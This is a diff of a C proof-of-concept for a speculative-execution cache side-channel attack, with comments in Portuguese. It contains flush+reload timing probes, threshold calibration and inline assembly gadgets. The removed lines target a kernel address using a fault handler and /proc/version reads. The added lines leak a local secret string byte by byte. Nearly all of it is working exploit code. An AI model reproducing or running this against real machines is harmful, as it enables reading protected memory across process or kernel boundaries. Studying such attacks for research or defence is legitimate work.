@@ -1,17 +1,4 @@
 #define _GNU_SOURCE
-#define _GNU_SOURCE
-
-#include <stdio.h>
-#include <string.h>
-#include <signal.h>
-#include <ucontext.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <ctype.h>
-#include <sched.h>
-
-#include <x86intrin.h>
-
 
 
 
@@ -65,15 +52,6 @@ static inline long Probe(void *addr) {
    			);
   return tempo;
 }
-void clflush_target(char *target_array)
-{
-        int i;
-        for (i = 0; i < 259; i++) 
-	{
-  		_mm_clflush(&target_array[i * 4096]);
-	}
-}
-
 
 static inline void Flush(void *addr)
 {
@@ -104,21 +82,19 @@ unsigned Treshold(void *baseSrc)
 		
 		
 			probe=Probe(base+j*LEN_PAGE);
-			printf("probe1 %8X\n",probe);
 			totalComFlush+=probe;
 			//printf("com flush %8X\n",probe);
 		
 			probe=Probe(base+j*LEN_PAGE);
-			printf("probe2 %8X\n",probe);
 			totalSemFlush+=probe;
 			i++;
 		
 			//printf("sem flush %8X\n",probe);
 	
 		}
-		totalComFlush+=totalComFlush/j;
-		totalSemFlush+=totalSemFlush/j;
 	}
+	totalComFlush=totalComFlush/(i);
+	totalSemFlush=totalSemFlush/(i);
 	printf("media com flush = %08X\n",(unsigned)totalComFlush);
 	printf("media sem flush = %08X\n",(unsigned )totalSemFlush);
 		
@@ -132,7 +108,7 @@ static inline int FindSecret(void *baseSrc,unsigned treshold)
 	void *base=baseSrc;
 	unsigned tempo;
 	unsigned menort=999999;
-	int i=1;
+	int i=2;
 	int isValid=0;
   	unsigned char alvo;	
 	while (i<256){
@@ -212,60 +188,73 @@ int installHandler() {
   
   return 0;
 }
-static void __attribute__((noinline))
-spec(char *addr , char *base )
+
+static inline void spec(char *addr , char *base )
 {
 
-		asm volatile (
-				"1:\n\t"
-				"	.rept 300\n\t"
-				"	add $0x141, %%eax\n\t"
-				"	.endr\n\t"
-				"	movzx (%[addr]), %%eax\n\t"
-				"	shl $12, %%eax\n\t"
-				"	jz 1b\n\t"
-				"	movzx (%[base], %%eax, 1), %%ebx\n"
-				"stopspeculate: \n\t"
-				"	nop\n\t"
-				:
-				: [base] "r" (base),  [addr] "r" (addr)
-				: "eax", "ebx"
-																					);
 
-
-}
-static inline void ReadByte(char *addr,char *base,int fd,unsigned treshold)
-{
-	int i,ret;
-	static char buffer[20];
-	char *ptrArray2;
-
-	for (i = 0; i < 5000; i++) {
- 		
-		ptrArray2=(char *)malloc(LEN_PAGE*258)+LEN_PAGE;	
-		ret = pread(fd, buffer, sizeof(buffer), 0);
-		//printf("%s\n",buffer);
-		if (ret < 0) {
-			perror("pread");
-			break;
-		}
-		//printf("ret = %i\n",ret);
-		//printf("addr=%p\n",addr);
-		//printf("contet=%c\n",*addr);
-		clflush_target(ptrArray2);
-		spec(addr, ptrArray2);
-		asm __volatile__(
-				"mfence\n"
-				"lfence\n"
-			);
-		FindSecret(ptrArray2,treshold);
-		//free(ptrArray-LEN_PAGE);
-	
+	//printf("helloo\n");
+	char dummy='\0';
+	char *vector[200];
+	char *fim_offset;
+	register char ** startVector;
+	register char *ptrAddr;
+	int i;
+	for (i=0;i<100;i++)
+	{
+		vector[i]=&dummy;
 	}
+	for (i=100;i<200;i++)
+	{
+		vector[i]=addr;
+	}
+	//fim_offset=vector[100];
+	startVector=&vector;
+	//printf("fim offset: %p\n",fim_offset);
+	//printf("vector= %p ,vector0=%p , dummy= %p ,vector100=%p, addr = %p , base=%p\n",vector,vector[0],&dummy,vector[100],addr,base);
+	//printf("vector= %p , dummy= %p ,addr = %p\n",vector,&dummy,addr);
+	//printf("char * len = %i\n",sizeof(char *))	;
+	
+	
+	startVector=vector;
+	ptrAddr=*startVector;
+	//printf("so far so good\n");
 
+		asm __volatile__(
+			"nop				\n"
+			"nop				\n"
+			"nop				\n"
+			"start:				\n"
+			"	mov %0 , %%eax 				\n"
+			"	mov %1 , %%ebx				\n"
+			"					\n"
+			"	xor %%esi,%%esi				\n"
+			"repeat:				\n"
+			"	nop				\n"
+			"	nop				\n"
+			"	mov (%%eax) , %%edx 			\n"
+			"	xor %%ecx , %%ecx			\n"
+			"	.rept 10			\n"
+			"	add $2 , %%esi			\n"
+			"	.endr			\n"
+			"	cmp $2020,%%esi			\n"
 
+			"	jz fim			\n"
+			"	mov (%%edx) , %%cl			\n"
+			"	shl $12 , %%ecx			\n"
+			"	mov (%%ebx,%%ecx) , %%cl			\n"
+			"	add $4 , %%eax			\n"
+			"	jmp repeat				\n"
+			"fim:			\n"
+			"	nop				\n"
+			"	nop			\n"
+			://no output
+			:"r" (startVector) , "m" (base) 
+			: "eax" , "ebx" , "ecx" , "edx" , "esi" 
+			
+			);
+	
 }
-
 
 int main(void)
 {
@@ -277,23 +266,25 @@ int main(void)
 	char *segredo="isso eh secreto, esse texto eh realmente muito longo. Cuidado com instrucoes especuladas";
 	printf("segredo= %p\n",segredo);	
 	char c;
-	installHandler();
+	//installHandler();
 
-	segredo=0xcf83b060;
+
 	treshold=Treshold(malloc(LEN_PAGE*257)+LEN_PAGE);
 	printf("treshold: %08X\n",treshold);
-	
 
-	fd=open("/proc/version", O_RDONLY);
-	if (fd < 0) {
-		perror("open");
-		return -1;
-	}
-	for(i=0;i<2 ; i++)
+
+	for(i=0;i<20 ; i++)
 	{
 		//for (int j=0 ; j<100 ; j++)
 		//{
-			ReadByte(segredo+i, (char *)ptrArray2,fd,treshold);
+ 			ptrArray2=(char *)malloc(LEN_PAGE*257);//+LEN_PAGE;	
+			spec(segredo+i, (char *)ptrArray2);
+			asm __volatile__(
+					"mfence\n"
+					"lfence\n"
+					);
+			FindSecret(ptrArray2,treshold);
+			//free(ptrArray-LEN_PAGE);
 		//}
 		printf("\n");	
 	}
